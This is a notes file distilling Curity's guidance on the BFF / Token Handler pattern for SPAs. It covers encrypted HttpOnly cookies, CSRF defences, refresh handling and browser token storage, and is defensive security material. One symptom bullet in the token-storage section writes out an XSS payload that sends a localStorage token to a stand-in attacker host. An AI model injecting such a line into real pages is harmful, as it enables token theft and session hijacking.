---
source: Curity — BFF / Token Handler pattern for SPAs
url: https://curity.io/resources/learn/the-bff-pattern/
fetched: 2026-06-17
status: practitioner (Curity)
feeds: [bff-token-handler, token-storage-browser]
---

# Curity — BFF / Token Handler pattern for SPAs — load-bearing requirements

Notes distilled per concept slug from two Curity practitioner pages:
- BFF pattern: https://curity.io/resources/learn/the-bff-pattern/
- Token Handler overview: https://curity.io/resources/learn/token-handler-overview/

This is a **practitioner / vendor best-practice** source (web upstream tier), NOT a spec and NOT RHBK ground truth.
Curity coins the pattern as two components: **OAuth Agent** (BFF that runs the code flow) + **OAuth Proxy** (API-gateway plugin that swaps cookie→bearer). Section names are Curity headings (no normative § numbers — vendor doc).
RULE / ANTI-PATTERN / SYMPTOM per bullet. Paraphrased tightly (copyright).

## bff-token-handler

- RULE: A server-side **OAuth Agent** runs the Authorization Code Flow + PKCE on behalf of the SPA as a *confidential* client; the SPA only makes same-origin Ajax calls to the Agent (Token Handler §"OAuth Agent"). The Agent holds the client credential (secret / mTLS), never the browser.
  - ANTI-PATTERN: SPA runs the code flow itself and/or ships `client_secret` in the JS bundle; treating the SPA as a confidential client.
  - SYMPTOM: client secret visible in bundled JS / network tab; SPA hits the AS token endpoint directly; pen-test "credentials exposed to browser".
- RULE: The OAuth Agent **encrypts all tokens (access + refresh + ID) into HTTP-only cookies**; no token is ever returned to JavaScript (Token Handler §"OAuth Agent Cookies"). Stateless: encrypted cookie carries the state, so no server session store is mandatory; the encryption key stays in the backend.
  - ANTI-PATTERN: returning tokens in a JSON response to the SPA; plaintext JWT in the cookie; client-side encryption with a key reachable from JS; an OAuth Agent that keeps a server-side token DB when it claims to be stateless.
  - SYMPTOM: raw JWT/opaque token visible in DevTools; cookie body decodes without the server key; token refresh breaks after server restart or across clustered Agent instances.
- RULE: Every OAuth Agent / Proxy cookie MUST carry four attributes — `HttpOnly`, `Secure`, `SameSite=strict`, `Path=/` (Token Handler §"OAuth Agent Cookies"). HttpOnly blocks JS read; Secure forces TLS; SameSite=strict blocks cross-site send; Path=/ shares it across the domain's APIs.
  - ANTI-PATTERN: omitting `HttpOnly`/`Secure`; using `SameSite=lax` or `none`; narrow path.
  - SYMPTOM: `document.cookie` reads the session in an XSS payload; cookie sent on cross-site requests; cookie visible on plaintext traffic; "SameSite cookie blocked" console warning.
- RULE: CSRF defense is **three layered** — (1) `SameSite=strict` cookies, (2) CORS origin enforcement / preflight, (3) a required fixed custom header (e.g. `token-handler-version=1`) on every request so attacker forms can't issue a CORS "simple request" (Token Handler §"Cross Site Request Forgery Protections").
  - ANTI-PATTERN: relying on SameSite alone; accepting requests with no custom-header requirement; permissive CORS.
  - SYMPTOM: cross-site form/CSRF triggers a login or `/refresh` using the victim's cookie; unauthorized token mint from attacker origin.
- RULE: The Token Handler components MUST be hosted on the **same parent domain** as the SPA's web origin (e.g. `example.com`, `api.example.com`, `bff.example.com`) so cookies are *first-party* (BFF §"Different Deployment Options"; Token Handler §"Hosting Prerequisite").
  - ANTI-PATTERN: OAuth Agent on a different root / cross-host auth domain; iframe-based cross-domain SSO relying on third-party cookies.
  - SYMPTOM: browser tracking-prevention drops the cookie as third-party; intermittent session loss in Safari/Firefox; 401 on API calls because the cookie is missing.
- RULE: When the SPA calls APIs it sends the **proxy cookie**, not a bearer token; the **OAuth Proxy** (an API-gateway plugin, not a remote hop) decrypts it, extracts the access token, and forwards `Authorization: Bearer <token>` to microservices — optionally converting an opaque token to a JWT via the Phantom Token pattern (Token Handler §"OAuth Proxy").
  - ANTI-PATTERN: SPA attaches its own bearer header; APIs try to parse the encrypted cookie as a JWT; running the Proxy as a separate microservice that each API calls remotely.
  - SYMPTOM: token visible in the SPA's `Authorization` header; API logs "invalid token" / cannot decode header; per-request latency / gateway bottleneck.
- RULE: The proxy cookie / access token is **short-lived** (e.g. ~15 min); the Agent exposes `/refresh` to rotate it; the SPA serializes concurrent refreshes and prefers **single-use (rotating) refresh tokens** for concurrency safety (Token Handler §"Access Token Usage").
  - ANTI-PATTERN: long-lived access tokens; no refresh; replaying the same refresh token across concurrent tabs.
  - SYMPTOM: stolen cookie usable for a long window; concurrent calls race to 401 ("thundering herd"); one refresh succeeds, others fail "invalid refresh token".
- RULE: OAuth Agent exposes a small standard endpoint set the SPA drives via Ajax — `GET /session`, `POST /login/start`, `POST /login/end`, `POST /refresh`, `POST /logout` — and the *real* browser redirect happens under SPA control (returned URL), not via an abrupt server `Location` redirect (Token Handler §"OAuth Agent Operations" / §"Login User Experience").
  - ANTI-PATTERN: Agent emitting a server-side redirect that bypasses the SPA; custom/non-standard endpoint naming; SPA calling the AS token endpoint itself.
  - SYMPTOM: SPA state/scroll lost on the OAuth bounce; UI flashing; `/refresh` 404; no way to query auth state.
- RULE: Between `/login/start` and `/login/end` the Agent keeps a **temporary encrypted cookie** holding the OAuth `state` and PKCE `code_verifier` (Token Handler §"OAuth Agent Cookies").
  - ANTI-PATTERN: putting `state`/`code_verifier` in a URL/query, response body, or localStorage.
  - SYMPTOM: state-mismatch / code-substitution error at the callback; `code_verifier` lost on reload.
- RULE: Watch cookie size — each cookie should stay under ~4 KB and within HTTP header limits (~4–8 KB); prefer compact JWT algs (ES256 / EdDSA) or opaque tokens to keep encrypted cookies small (Token Handler §"Cookie Limits") (inferred grouping — Curity lists this as an implementation constraint).
  - ANTI-PATTERN: RS256 + large claim payloads stuffed into one cookie.
  - SYMPTOM: HTTP `431 Request Header Fields Too Large`; gateway rejects request; cookie truncation / lost session.
- RULE: Separation of concerns — the SPA's **static content host (CDN) issues no cookies and handles no tokens**; all OAuth work is delegated to the OAuth Agent; multiple micro-frontends under the same parent domain can share the Agent's cookies (Token Handler §"Token Handler Pattern" / §"Micro-Frontends").
  - ANTI-PATTERN: baking OAuth logic into the static web server; a separate Agent per micro-frontend forcing re-login.
  - SYMPTOM: static content can't be CDN-cached; user re-prompted to log in moving between micro-frontends.

## token-storage-browser

- RULE: **Keep all tokens out of the browser.** No access/refresh/ID token in JS variables, the `window` object, the DOM, `localStorage`, `sessionStorage`, or any JS-readable cookie — only encrypted HttpOnly cookies (BFF §"The Security Issues of an SPA" / §"Recommended Solution"; Token Handler §"Browser Security").
  - ANTI-PATTERN: stashing a JWT in `localStorage`/`sessionStorage`; holding a token in a JS variable / on `window`; document-writable cookie.
  - SYMPTOM: XSS runs `fetch('//attacker/?t='+localStorage.getItem('token'))`; token visible in DevTools Storage; session hijack from exfiltrated JWT.
- RULE: Defense rests on the **browser's own security boundary** (HttpOnly + SameSite), not app-level filtering — an executed XSS payload still cannot read or send an encrypted HttpOnly cookie (BFF §"The Security Issues of an SPA"; Token Handler §"Browser Security").
  - ANTI-PATTERN: assuming application XSS sanitizers / CSP fully protect tokens kept in JS-reachable memory.
  - SYMPTOM: pen-test extracts tokens despite CSP; CSP bypassed (`unsafe-inline`, `data:` URI); unpatched JS lib (e.g. an old jQuery/Lodash) leaks the token.
- RULE: **Refresh tokens are the highest-value target** — a browser-stored refresh token lets an attacker mint new access tokens long after the user leaves, so it must never be JS-accessible (BFF §"The Security Issues of an SPA").
  - ANTI-PATTERN: storing a long-lived refresh token in `localStorage`; exposing a refresh endpoint to the SPA without server-side cookie exchange.
  - SYMPTOM: attacker reuses a stolen 90-day refresh token weeks later; audit logs show access from an attacker IP after the session "ended".
- RULE: Assume XSS **will** happen — the token handler limits the *blast radius* (no token to steal) but does NOT replace a secure-SDLC: still do CSP, input validation, output encoding, dependency vetting (BFF §"The Security Issues of an SPA"; Token Handler §"Developer Experience").
  - ANTI-PATTERN: treating "tokens are out of the browser" as full security; skipping CSP / DOM sanitization.
  - SYMPTOM: XSS still replays the session cookie or exfiltrates user data via legitimate API calls even though the raw token wasn't stolen.
- RULE: Don't depend on **third-party cookies / iframe SSO** for token refresh — browser tracking-prevention drops cross-domain cookies; use first-party cookies (Token Handler on same parent domain) and server-side refresh instead (BFF §"The Security Issues of an SPA"; Token Handler §"Browser Security").
  - ANTI-PATTERN: silent iframe re-auth against a cross-domain AS; SPA-held refresh token doing cross-domain refresh.
  - SYMPTOM: Safari/Chrome blocks the third-party cookie; silent renew fails; user logged out unexpectedly; "third-party cookie blocked" warning; 401 on next API call.

## RHBK / Keycloak mapping (context — verify against ground truth)

- Curity's OAuth Agent ≈ a confidential Keycloak client doing standard authorization-code + PKCE; the SPA becomes a *confidential* BFF-fronted client rather than a public SPA client. (inferred — Curity is vendor-neutral; confirm Keycloak client-type / PKCE settings against the RHBK ground-truth tier before asserting in a wiki page.)
- Maps cleanly onto OAuth 2.1 / Browser-Based Apps BCP guidance already staged here (see oauth21.md, rfc7636 PKCE) — Curity is the practitioner articulation of "no tokens in the browser" + BFF. Cross-link [[bff-token-handler]] and [[token-storage-browser]] at ingest.
